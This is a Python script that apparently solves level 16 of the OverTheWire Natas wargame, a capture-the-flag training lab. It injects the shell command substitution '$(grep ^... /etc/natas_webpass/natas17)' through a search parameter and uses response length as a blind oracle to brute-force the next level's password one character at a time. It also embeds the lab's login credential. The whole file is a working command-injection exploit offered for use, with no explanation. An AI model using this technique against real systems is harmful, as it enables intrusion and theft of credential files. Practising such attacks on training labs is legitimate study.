import requests
import string

url = "http://natas16.natas.labs.overthewire.org/"
auth = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")

CHAR_SET = string.ascii_letters + string.digits

password = ""

for pos in range(1, 40):
    for char in CHAR_SET:
        payload = f"$(grep ^{password + char} /etc/natas_webpass/natas17)chicken"
        r = requests.get(url, auth=auth, params={"needle": payload})
        if int(len(r.text)) != 1153:
            password += char
            print(f"[+] Found {char} is true charector in {pos} position")
            break
            
        else:
            print(f"[-] {char} isn't true charector in {pos} position")
            
print(password)

